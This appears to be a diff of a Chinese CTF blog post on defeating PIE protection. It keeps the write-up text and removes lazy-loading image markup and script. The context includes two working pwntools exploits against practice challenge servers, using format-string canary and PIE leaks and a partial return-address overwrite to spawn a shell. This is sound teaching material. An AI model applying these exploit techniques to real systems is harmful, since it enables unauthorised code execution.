@@ -143,7 +143,7 @@
         <div class="left">
             
                 <a class="logo-image h-8 w-8 sm:w-10 sm:h-10 mr-3" href="/">
-                    <img src="/img/loading.gif" data-original="/images/favicon.png" class="w-full h-full rounded-sm">
+                    <img src="/images/favicon.png" class="w-full h-full rounded-sm">
                 </a>
             
             <a class="logo-title" href="/">
@@ -261,7 +261,7 @@
         
             <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
                 <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
-                    <img src="/img/loading.gif" data-original="/images/avatar.jpg">
+                    <img src="/images/avatar.jpg">
                 </div>
                 <div class="info flex flex-col justify-between">
                     <div class="author flex items-center">
@@ -333,7 +333,7 @@
 <ul>
 <li>从ida来看，地址基本都是<strong>四位数</strong>，如下：</li>
 </ul>
-<p><img lazyload src="/img/loading.gif" data-original="/images/loading.svg" data-src="/PIE%E4%BF%9D%E6%8A%A4/ida%E7%9C%8Bpie.bmp"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/PIE%E4%BF%9D%E6%8A%A4/ida%E7%9C%8Bpie.bmp"></p>
 <ul>
 <li>差别还是很明显的，因此我们不能直接利用这些地址操作，要先寻找到pie的基地址，ida给出来的只是偏移地址。</li>
 </ul>
@@ -350,11 +350,11 @@
 <li>注意程序要先run起来，才可以打断点</li>
 </ul>
 <h3 id="具体题目"><a href="#具体题目" class="headerlink" title="具体题目"></a>具体题目</h3><h3 id="1-深育杯-2021-find-flag-格式化字符串-pie"><a href="#1-深育杯-2021-find-flag-格式化字符串-pie" class="headerlink" title="1.[深育杯 2021]find_flag(格式化字符串-pie)"></a>1.<strong>[深育杯 2021]find_flag</strong>(格式化字符串-pie)</h3><p><a class="link" target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/774">题目地址 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<p><img lazyload src="/img/loading.gif" data-original="/images/loading.svg" data-src="/PIE%E4%BF%9D%E6%8A%A4/checksec.bmp"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/PIE%E4%BF%9D%E6%8A%A4/checksec.bmp"></p>
 <ul>
 <li><strong>保护全开直接看ida</strong></li>
 </ul>
-<p><img lazyload src="/img/loading.gif" data-original="/images/loading.svg" data-src="/PIE%E4%BF%9D%E6%8A%A4/%E4%B8%BB%E5%87%BD%E6%95%B0.bmp"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/PIE%E4%BF%9D%E6%8A%A4/%E4%B8%BB%E5%87%BD%E6%95%B0.bmp"></p>
 <ul>
 <li><strong>很明显的格式化字符串漏洞，先泄露canary和pie基地址，然后栈溢出到后门函数就可以了</strong> (此题有后门函数)</li>
 </ul>
@@ -362,18 +362,18 @@
 <ul>
 <li>在格式化字符串漏洞那里下断点：</li>
 </ul>
-<p><img lazyload src="/img/loading.gif" data-original="/images/loading.svg" data-src="/PIE%E4%BF%9D%E6%8A%A4/gdb%E6%89%BE%E5%81%8F%E7%A7%BB.bmp"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/PIE%E4%BF%9D%E6%8A%A4/gdb%E6%89%BE%E5%81%8F%E7%A7%BB.bmp"></p>
 <ul>
 <li>先让程序start，然后如上面下断点，查看栈结构</li>
 <li><strong>rbp上方的就是canary</strong>, 距离rsp偏移是11，看最左侧也可以看出来，0xb，再加上6个寄存器(64位),偏移地址是17</li>
 <li>如何泄露pie地址，我们要得到一个<strong>既可以在ida中可以查看偏移的地址，也可以泄露出其真实地址的地方</strong>， 正如下方,偏移位0x146f的地方,泄露这个地方的地址，减去0x146f，就可以得到pie的基地址了。</li>
 <li><font color="red">注意：ROPgadget看到的地址也只是偏移地址，要加上pie的基地址后才可以使用：</font></li>
 </ul>
-<p><img lazyload src="/img/loading.gif" data-original="/images/loading.svg" data-src="/PIE%E4%BF%9D%E6%8A%A4/ROPgadget.bmp"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/PIE%E4%BF%9D%E6%8A%A4/ROPgadget.bmp"></p>
 <h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./pwn&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node4.anna.nssctf.cn&quot;</span>,<span class="number">28406</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 格式化字符串泄露canary和pie基地址</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Hi! What&#x27;s your name? &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;%17$p-%19$p&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Nice to meet you, &quot;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(p.recv(<span class="number">18</span>),<span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;-&#x27;</span>)</span><br><span class="line">pie_base = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>) - <span class="number">0x146F</span> </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;[+][+][+]canary = <span class="subst">&#123;<span class="built_in">hex</span>(canary)&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;[+][+][+]pie_base = <span class="subst">&#123;<span class="built_in">hex</span>(pie_base)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 栈溢出getflag</span></span><br><span class="line">getflag = pie_base + <span class="number">0x01231</span></span><br><span class="line">ret = pie_base + <span class="number">0x000000000000101a</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Anything else? &quot;</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x38</span>) + p64(canary) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span> + p64(ret) + p64(getflag)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
 
 <h6 id><a href="#" class="headerlink" title></a></h6><h3 id="2-linkctf-2018-7-babypie"><a href="#2-linkctf-2018-7-babypie" class="headerlink" title="2.linkctf_2018.7_babypie"></a>2.linkctf_2018.7_babypie</h3><p><a class="link" target="_blank" rel="noopener" href="https://buuoj.cn/challenges#linkctf_2018.7_babypie">题目链接 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<p><img lazyload src="/img/loading.gif" data-original="/images/loading.svg" data-src="/PIE%E4%BF%9D%E6%8A%A4/pie2-1.bmp"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/PIE%E4%BF%9D%E6%8A%A4/pie2-1.bmp"></p>
 <ul>
 <li><strong>通过printf遇到\x00才会停止输出的特性，从而泄露canary</strong></li>
 <li><font color="red">但是此时无法泄露出pie的基地址了，那么我们就无法修改ret_address了吗？其实不然</font></li>
@@ -383,19 +383,19 @@
 <li>此题目就是如此，但是只需要修改末两位就可以getshell</li>
 </ul>
 <p><font size="4"><strong>gdb 调试，画框部分其实就是main函数结束后的返回地址，发现偏移是0xa6a</strong></font></p>
-<p><img lazyload src="/img/loading.gif" data-original="/images/loading.svg" data-src="/PIE%E4%BF%9D%E6%8A%A4/pie2-2.bmp"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/PIE%E4%BF%9D%E6%8A%A4/pie2-2.bmp"></p>
 <p><strong><font size="4">ida中system(“&#x2F;bin&#x2F;sh”)的地址偏移是0xa42，只有后两位不同，修改后两位即可</font></strong></p>
-<p><img lazyload src="/img/loading.gif" data-original="/images/loading.svg" data-src="/PIE%E4%BF%9D%E6%8A%A4/pie2-3.bmp"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/PIE%E4%BF%9D%E6%8A%A4/pie2-3.bmp"></p>
 <h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./pwn&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">26786</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x25</span>+<span class="string">b&#x27;bbbb&#x27;</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Input your Name:\n&quot;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;bbbb&#x27;</span>)</span><br><span class="line">canary = u64(p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;[+][+][+]canary = <span class="subst">&#123;<span class="built_in">hex</span>(canary)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#getshell = 0x00A3E</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x28</span>) + p64(canary) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span> + <span class="string">b&#x27;\x42&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
 
 <h4 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h4><p>如果有多位不同，而我们又只能逐字节更改，有时就需要自己写脚本爆破了</p>
 <h3 id="3-Basectf-week3-PIE-爆破返回地址"><a href="#3-Basectf-week3-PIE-爆破返回地址" class="headerlink" title="3.Basectf-week3-PIE(爆破返回地址)"></a>3.Basectf-week3-PIE(爆破返回地址)</h3><p><a class="link" target="_blank" rel="noopener" href="https://www.basectf.fun/">题目链接 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<p><img lazyload src="/img/loading.gif" data-original="/images/loading.svg" data-src="/PIE%E4%BF%9D%E6%8A%A4/3-1.bmp"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/PIE%E4%BF%9D%E6%8A%A4/3-1.bmp"></p>
 <ul>
 <li>发现主函数就这些，什么都没有，所以我们要泄露libc，获得system函数,所需的gadget。</li>
 <li>但是我们无法像基本的ret2libc一样ret到main函数，那么如何修改呢？看下面的调试：</li>
 </ul>
-<h4 id="gdb调试："><a href="#gdb调试：" class="headerlink" title="gdb调试："></a>gdb调试：</h4><h5 id="1-填满栈空间，查看ret-address"><a href="#1-填满栈空间，查看ret-address" class="headerlink" title="1.填满栈空间，查看ret_address"></a>1.填满栈空间，查看ret_address</h5><p><img lazyload src="/img/loading.gif" data-original="/images/loading.svg" data-src="/PIE%E4%BF%9D%E6%8A%A4/3-2.bmp"></p>
+<h4 id="gdb调试："><a href="#gdb调试：" class="headerlink" title="gdb调试："></a>gdb调试：</h4><h5 id="1-填满栈空间，查看ret-address"><a href="#1-填满栈空间，查看ret-address" class="headerlink" title="1.填满栈空间，查看ret_address"></a>1.填满栈空间，查看ret_address</h5><p><img lazyload src="/images/loading.svg" data-src="/PIE%E4%BF%9D%E6%8A%A4/3-2.bmp"></p>
 <ul>
 <li>如图，返回地址是__libc_start_main+128，按照之前的方法来说，这里应该是一个pie+偏移的地址，我们修改末两字节就可以返回到main函数，然后通过泄露的地址计算出pie基地址，进行其他操作。</li>
 <li>但是这里不是，但是难道就不行了吗？其实不然，__libc_start_main函数附近也有gadget可以使我们返回main函数，可以自己用telescope去慢慢找，但是也可以直接爆破。</li>
@@ -705,7 +705,7 @@
     </div>
 
     <div class="image-viewer-container">
-    /img/loading.gif" data-original="<img src="">
+    <img src="">
 </div>
 
 
@@ -832,18 +832,5 @@
 
 
 
-
-        <style>
-            [bg-lazy] {
-                background-image: none !important;
-                background-color: #eee !important;
-            }
-        </style>
-        <script>
-            window.imageLazyLoadSetting = {
-                isSPA: false,
-                preloadRatio: 1,
-                processImages: null,
-            };
-        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script><script>(r=>{r.imageLazyLoadSetting.processImages=t;var a=r.imageLazyLoadSetting.isSPA,o=r.imageLazyLoadSetting.preloadRatio||1,d=i();function i(){var t=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")),e=Array.prototype.slice.call(document.querySelectorAll("[bg-lazy]"));return t.concat(e)}function t(t){(a||t)&&(d=i());for(var e,n=0;n<d.length;n++)0<=(e=(e=d[n]).getBoundingClientRect()).bottom&&0<=e.left&&e.top<=(r.innerHeight*o||document.documentElement.clientHeight*o)&&(()=>{var t,e,a,o,i=d[n];e=function(){d=d.filter(function(t){return i!==t}),r.imageLazyLoadSetting.onImageLoaded&&r.imageLazyLoadSetting.onImageLoaded(i)},(t=i).dataset.loaded||(t.hasAttribute("bg-lazy")?(t.removeAttribute("bg-lazy"),e&&e()):(a=new Image,o=t.getAttribute("data-original"),a.onload=function(){t.src=o,t.removeAttribute("data-original"),t.setAttribute("data-loaded",!0),e&&e()},a.onerror=function(){t.removeAttribute("data-original"),t.setAttribute("data-loaded",!1),t.src=o},t.src!==o&&(a.src=o)))})()}function e(){clearTimeout(t.tId),t.tId=setTimeout(t,500)}t(),document.addEventListener("scroll",e),r.addEventListener("resize",e),r.addEventListener("orientationchange",e)})(this);</script></body>
+</body>
 </html>
